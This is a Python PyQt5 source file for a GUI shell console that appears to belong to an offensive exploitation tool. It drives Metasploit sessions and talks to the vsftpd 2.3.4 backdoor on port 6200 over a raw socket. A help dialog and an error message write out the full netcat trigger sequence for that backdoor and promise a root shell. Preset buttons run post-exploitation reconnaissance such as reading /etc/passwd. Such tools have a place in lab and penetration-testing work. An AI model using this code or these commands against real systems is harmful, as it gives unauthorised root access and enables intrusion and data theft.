"""
Meterpreter shell interface for interacting with sessions
"""

import re
import time
import socket
import subprocess
from datetime import datetime

from PyQt5.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QTextEdit, QLineEdit,
    QPushButton, QLabel, QGroupBox, QComboBox, QMessageBox,
    QSplitter, QSizePolicy
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QFont, QColor

class MeterpreterShell(QWidget):
    """Meterpreter shell interface for session interaction"""
    
    command_executed = pyqtSignal(str, str)  # command, output
    
    def __init__(self, exploit_controller):
        super().__init__()
        self.exploit_ctrl = exploit_controller
        self.current_session = None
        self.session_type = None
        self.init_ui()
        
    def init_ui(self):
        """Initialize the meterpreter shell UI"""
        main_layout = QVBoxLayout(self)
        
        # Create a splitter for better layout
        splitter = QSplitter(Qt.Vertical)
        
        # Top section: Session info
        session_group = QGroupBox("📡 Active Session Information")
        session_layout = QVBoxLayout()
        
        self.session_info_label = QLabel("No active session")
        self.session_info_label.setStyleSheet("""
            QLabel {
                color: #FF9800;
                font-weight: bold;
                padding: 15px;
                background-color: #222;
                border-radius: 8px;
                border: 2px solid #555;
                font-size: 11pt;
                min-height: 100px;
            }
        """)
        self.session_info_label.setAlignment(Qt.AlignCenter)
        self.session_info_label.setWordWrap(True)
        session_layout.addWidget(self.session_info_label)
        
        session_group.setLayout(session_layout)
        splitter.addWidget(session_group)
        
        # Middle section: Shell output
        output_group = QGroupBox("📝 Shell Output")
        output_layout = QVBoxLayout()
        
        self.output_text = QTextEdit()
        self.output_text.setReadOnly(True)
        self.output_text.setStyleSheet("""
            QTextEdit {
                font-family: 'Courier New', monospace;
                font-size: 10pt;
                background-color: #000;
                color: #0F0;
                border: 2px solid #444;
                border-radius: 6px;
                padding: 10px;
                min-height: 200px;
            }
        """)
        
        # Add welcome message
        welcome_msg = """============================================
METERPRETER/SHELL INTERFACE
============================================
Type commands below and press Enter.

Common commands:
• whoami       - Show current user
• id           - Show user/group IDs
• pwd          - Print working directory
• ls -la       - List directory contents
• ps aux       - List all processes
• ifconfig     - Network interfaces
• uname -a     - System information
• cat /etc/passwd - Show system users
============================================
"""
        self.output_text.setPlainText(welcome_msg)
        
        output_layout.addWidget(self.output_text)
        output_group.setLayout(output_layout)
        splitter.addWidget(output_group)
        
        # Bottom section: Command input
        command_group = QGroupBox("⌨️ Command Input")
        command_layout = QVBoxLayout()
        
        # Command input with history
        input_layout = QHBoxLayout()
        input_layout.addWidget(QLabel("Command:"))
        
        self.cmd_combo = QComboBox()
        self.cmd_combo.setEditable(True)
        self.cmd_combo.addItems([
            "whoami",
            "id",
            "pwd",
            "ls -la",
            "ps aux",
            "uname -a",
            "ifconfig",
            "cat /etc/passwd",
            "netstat -tulpn",
            "df -h"
        ])
        self.cmd_combo.setStyleSheet("""
            QComboBox {
                padding: 8px;
                font-size: 11pt;
                background-color: #222;
                color: white;
                border: 1px solid #555;
                border-radius: 4px;
                min-height: 30px;
            }
            QComboBox::drop-down {
                border: none;
                width: 30px;
            }
        """)
        input_layout.addWidget(self.cmd_combo, 1)
        
        # Execute button
        self.execute_btn = QPushButton("🚀 Execute")
        self.execute_btn.setStyleSheet("""
            QPushButton {
                background-color: #2196F3;
                color: white;
                font-weight: bold;
                padding: 10px 20px;
                border-radius: 6px;
                border: none;
                font-size: 11pt;
                min-width: 100px;
            }
            QPushButton:hover {
                background-color: #1976D2;
            }
            QPushButton:disabled {
                background-color: #757575;
                color: #BBB;
            }
        """)
        self.execute_btn.clicked.connect(self.execute_command)
        input_layout.addWidget(self.execute_btn)
        
        command_layout.addLayout(input_layout)
        
        # Quick command buttons (single row)
        quick_cmd_layout = QHBoxLayout()
        
        quick_commands = [
            ("👤 Whoami", "whoami"),
            ("🔍 ID", "id"),
            ("📁 List", "ls -la"),
            ("💾 PWD", "pwd"),
            ("📊 Processes", "ps aux"),
            ("📄 Users", "cat /etc/passwd")
        ]
        
        for label, cmd in quick_commands:
            btn = QPushButton(label)
            btn.setMaximumWidth(130)
            btn.clicked.connect(lambda checked, c=cmd: self.execute_quick_command(c))
            btn.setStyleSheet("""
                QPushButton {
                    background-color: #555;
                    color: white;
                    padding: 8px 5px;
                    border-radius: 4px;
                    font-size: 10pt;
                    border: 1px solid #666;
                }
                QPushButton:hover {
                    background-color: #666;
                }
                QPushButton:disabled {
                    background-color: #333;
                    color: #666;
                }
            """)
            quick_cmd_layout.addWidget(btn)
        
        quick_cmd_layout.addStretch()
        command_layout.addLayout(quick_cmd_layout)
        
        # Session management buttons
        session_mgmt_layout = QHBoxLayout()
        
        buttons = [
            ("🔄 Refresh", self.refresh_session, "#FF9800"),
            ("🗑️ Clear", self.clear_output, "#757575"),
            ("📋 Manual", self.show_manual_help, "#9C27B0"),
            ("🔒 Close", self.close_session, "#F44336")
        ]
        
        for text, handler, color in buttons:
            btn = QPushButton(text)
            btn.clicked.connect(handler)
            btn.setStyleSheet(f"""
                QPushButton {{
                    background-color: {color};
                    color: white;
                    padding: 8px 15px;
                    border-radius: 6px;
                    border: none;
                    font-size: 11pt;
                    min-width: 100px;
                }}
                QPushButton:hover {{
                    background-color: {'#F57C00' if color == '#FF9800' else 
                                      '#616161' if color == '#757575' else
                                      '#7B1FA2' if color == '#9C27B0' else
                                      '#D32F2F'};
                }}
                QPushButton:disabled {{
                    background-color: #333;
                    color: #666;
                }}
            """)
            session_mgmt_layout.addWidget(btn)
        
        session_mgmt_layout.addStretch()
        command_layout.addLayout(session_mgmt_layout)
        
        command_group.setLayout(command_layout)
        splitter.addWidget(command_group)
        
        # Set splitter sizes (30% session, 50% output, 20% input)
        splitter.setSizes([100, 300, 150])
        
        main_layout.addWidget(splitter)
        
        # Status bar at bottom
        status_layout = QHBoxLayout()
        
        self.status_label = QLabel("🟢 Ready - No active session")
        self.status_label.setStyleSheet("""
            QLabel {
                color: #4CAF50;
                font-weight: bold;
                padding: 8px 15px;
                background-color: #222;
                border-radius: 6px;
                border: 1px solid #444;
                font-size: 11pt;
                min-width: 250px;
            }
        """)
        status_layout.addWidget(self.status_label)
        
        status_layout.addStretch()
        
        self.command_count_label = QLabel("Commands: 0")
        self.command_count_label.setStyleSheet("""
            QLabel {
                color: #888;
                padding: 8px 15px;
                background-color: #222;
                border-radius: 6px;
                border: 1px solid #444;
                font-size: 11pt;
            }
        """)
        status_layout.addWidget(self.command_count_label)
        
        main_layout.addLayout(status_layout)
        
        # Initialize state
        self.command_count = 0
        self.update_button_states()
        
        # Connect enter key
        self.cmd_combo.lineEdit().returnPressed.connect(self.execute_command)
        
    def execute_command(self):
        """Execute the current command"""
        command = self.cmd_combo.currentText().strip()
        if not command:
            return
            
        self._execute_command_internal(command)
        
    def execute_quick_command(self, command):
        """Execute a quick command from button"""
        self.cmd_combo.setCurrentText(command)
        self._execute_command_internal(command)
        
    def _execute_command_internal(self, command):
        """Internal command execution logic"""
        if not self.current_session:
            self.append_output("[-] No active session. Please establish a session first.")
            return
            
        if not command:
            return
            
        # Add command to history if not already there
        if self.cmd_combo.findText(command) == -1:
            self.cmd_combo.addItem(command)
            
        # Show command in output
        self.append_output(f"\n[{datetime.now().strftime('%H:%M:%S')}] > {command}")
        
        # Execute based on session type
        if self.session_type == 'vsftpd_backdoor':
            output = self.execute_vsftpd_command(command)
        elif self.session_type in ['shell', 'meterpreter']:
            output = self.exploit_ctrl.execute_meterpreter_command(
                self.current_session.get('id', '1'), 
                command
            )
        else:
            output = "[-] Unknown session type"
            
        # Display output
        self.append_output(output)
        
        # Update stats
        self.command_count += 1
        self.command_count_label.setText(f"Commands: {self.command_count}")
        self.status_label.setText(f"🟢 Command executed")
        
    def execute_vsftpd_command(self, command):
        """Execute command on vsftpd backdoor"""
        if not self.current_session:
            return "[-] No session"
            
        target = self.current_session.get('target')
        if not target:
            return "[-] No target"
            
        # Check if manual connection is needed
        if self.current_session.get('needs_manual_connect'):
            return f"""
[-] This vsftpd session requires manual connection.

To connect manually:
1. Open terminal
2. Run: echo -e "USER hello:)\\\\nPASS world\\\\n" | timeout 2 nc {target} 21
3. Wait 2 seconds
4. Run: nc {target} 6200
5. Type commands directly in the nc session

Or click the '📋 Manual' button for detailed instructions.
"""
        
        # Try to execute via socket
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target, 6200))
            
            # Send command
            sock.send(command.encode() + b'\n')
            
            # Try to get response
            time.sleep(1)
            try:
                response = sock.recv(4096).decode('utf-8', errors='ignore')
            except:
                response = ""
                
            sock.close()
            
            if response:
                return response.strip()
            else:
                return "[+] Command sent (no response). The shell might be interactive."
                
        except ConnectionRefusedError:
            return f"[-] Connection refused on port 6200.\nThe vsftpd backdoor may have closed.\nTry re-exploiting or use manual connection."
        except Exception as e:
            return f"[-] Error: {str(e)}"
    
    def show_manual_help(self):
        """Show manual connection help for vsftpd"""
        if not self.current_session or not self.current_session.get('vsftpd'):
            QMessageBox.information(self, "Manual Connection", 
                "This feature is for vsftpd backdoor sessions.\n"
                "Establish a vsftpd session first.")
            return
            
        target = self.current_session.get('target', 'Unknown')
        
        help_text = f"""
        ⚠️ VSFTPD 2.3.4 BACKDOOR MANUAL CONNECTION
        ===========================================
        
        The vsftpd backdoor can be tricky. Here's how to connect manually:
        
        1. FIRST, trigger the backdoor:
           echo -e "USER hello:)\\\\nPASS world\\\\n" | timeout 2 nc {target} 21
        
        2. Wait 2-3 seconds
        
        3. THEN connect to the backdoor:
           nc {target} 6200
        
        Or use this one-liner:
        echo -e "USER hello:)\\\\nPASS world\\\\n" | timeout 2 nc {target} 21 && sleep 2 && nc {target} 6200
        
        Once connected, you'll have a root shell!
        
        Note: The backdoor might close quickly. Be ready to type commands immediately.
        """
        
        QMessageBox.information(self, "VSFTPD Manual Connection", help_text)
        
    def append_output(self, text):
        """Append text to output area"""
        current = self.output_text.toPlainText()
        self.output_text.setPlainText(current + "\n" + text)
        
        # Auto-scroll to bottom
        scrollbar = self.output_text.verticalScrollBar()
        scrollbar.setValue(scrollbar.maximum())
        
    def set_session(self, session_data):
        """Set the current session"""
        self.current_session = session_data
        
        # Determine session type
        self.session_type = session_data.get('session_type', 'unknown')
        if session_data.get('vsftpd', False):
            self.session_type = 'vsftpd_backdoor'
        
        # Update session info display
        target = session_data.get('target', 'Unknown')
        exploit = session_data.get('exploit', 'Unknown')
        user = session_data.get('user', 'Unknown')
        session_id = session_data.get('id', 'N/A')
        platform = session_data.get('platform', 'Unknown')
        
        session_info = f"""🟢 ACTIVE SESSION
============================
Session: {session_id}
Target: {target}
Exploit: {exploit}
User: {user}
Platform: {platform}
Type: {self.session_type}
============================"""
        
        if self.session_type == 'vsftpd_backdoor':
            manual_flag = session_data.get('needs_manual_connect', False)
            if manual_flag:
                session_info += f"""
⚠️ VSFTPD BACKDOOR TRIGGERED
Connect manually:
nc {target} 6200
============================"""
            else:
                session_info += f"""
⚠️ VSFTPD BACKDOOR
Port: 6200
Use 'Manual' button for help
============================"""
        
        self.session_info_label.setText(session_info)
        
        # Update UI
        self.status_label.setText(f"🟢 {platform} session active")
        self.update_button_states()
        
        # Add success message to output
        success_msg = f"""
============================================
🎉 EXPLOIT SUCCESSFUL!
============================================
Session: {session_id}
Target: {target}
Exploit: {exploit}
User: {user}
Platform: {platform}
============================================
Type commands below to interact...
============================================
"""
        
        if self.session_type == 'vsftpd_backdoor' and session_data.get('needs_manual_connect'):
            success_msg += f"""
⚠️ NOTE: VSFTPD backdoor triggered!
Connect manually: nc {target} 6200
Or click the '📋 Manual' button for help.
============================================
"""
        
        self.append_output(success_msg)
        
    def refresh_session(self):
        """Refresh session information"""
        if not self.current_session:
            self.append_output("[-] No active session to refresh")
            return
            
        session_id = self.current_session.get('id', '1')
        
        self.append_output(f"[{datetime.now().strftime('%H:%M:%S')}] 🔄 Refreshing session {session_id}...")
        
        # Try to get updated session info
        if self.session_type == 'vsftpd_backdoor':
            # Test vsftpd connection with a simple command
            output = self.execute_vsftpd_command("echo 'TEST'")
            if "TEST" in output or "Command sent" in output:
                self.append_output("[+] VSFTPD backdoor is still responsive")
                self.status_label.setText("🟢 VSFTPD active")
            else:
                self.append_output("[-] VSFTPD backdoor may be closed")
                self.status_label.setText("🟡 VSFTPD may be closed")
        else:
            # Try to get session info from controller
            session_info = self.exploit_ctrl.get_session_info(session_id)
            if session_info.get('active'):
                self.append_output(f"[+] Session {session_id} is still active")
                self.status_label.setText("🟢 Session active")
            else:
                self.append_output(f"[-] Session {session_id} may be closed")
                self.status_label.setText("🟡 Session may be closed")
                
    def clear_output(self):
        """Clear the output area"""
        self.output_text.clear()
        
        # Restore welcome message
        welcome_msg = """============================================
METERPRETER/SHELL INTERFACE
============================================
Type commands below and press Enter.

Common commands:
• whoami       - Show current user
• id           - Show user/group IDs
• pwd          - Print working directory
• ls -la       - List directory contents
• ps aux       - List all processes
• ifconfig     - Network interfaces
• uname -a     - System information
• cat /etc/passwd - Show system users
============================================
"""
        self.output_text.setPlainText(welcome_msg)
        
        self.command_count = 0
        self.command_count_label.setText("Commands: 0")
        
    def close_session(self):
        """Close the current session"""
        if not self.current_session:
            self.append_output("[-] No active session to close")
            return
            
        session_id = self.current_session.get('id', '1')
        target = self.current_session.get('target', 'Unknown')
        
        reply = QMessageBox.question(
            self, "Close Session",
            f"Close session {session_id} on {target}?",
            QMessageBox.Yes | QMessageBox.No, QMessageBox.No
        )
        
        if reply == QMessageBox.Yes:
            self.append_output(f"[{datetime.now().strftime('%H:%M:%S')}] 🔒 Closing session {session_id}...")
            
            if self.session_type == 'vsftpd_backdoor':
                # vsftpd sessions can't be closed via MSF, just clear our reference
                self.append_output("[+] VSFTPD backdoor reference cleared")
            else:
                # Close via controller
                success = self.exploit_ctrl.close_session(session_id)
                if success:
                    self.append_output(f"[+] Session {session_id} closed successfully")
                else:
                    self.append_output(f"[-] Failed to close session {session_id}")
            
            # Reset UI
            self.current_session = None
            self.session_type = None
            self.session_info_label.setText("No active session")
            self.status_label.setText("🟢 Ready - No active session")
            self.update_button_states()
            
    def update_button_states(self):
        """Update button states based on current session"""
        has_session = self.current_session is not None
        
        self.execute_btn.setEnabled(has_session)
        
        # Enable/disable all buttons that need session
        for btn in self.findChildren(QPushButton):
            if btn is self.execute_btn:
                continue  # Already handled
                
            btn_text = btn.text()
            if btn_text in ["🔄 Refresh", "🗑️ Clear", "📋 Manual", "🔒 Close"]:
                # These buttons are always enabled except Manual which needs vsftpd
                if btn_text == "📋 Manual":
                    btn.setEnabled(has_session and self.session_type == 'vsftpd_backdoor')
                else:
                    btn.setEnabled(has_session)
            elif btn_text in ["👤 Whoami", "🔍 ID", "📁 List", "💾 PWD", "📊 Processes", "📄 Users"]:
                btn.setEnabled(has_session)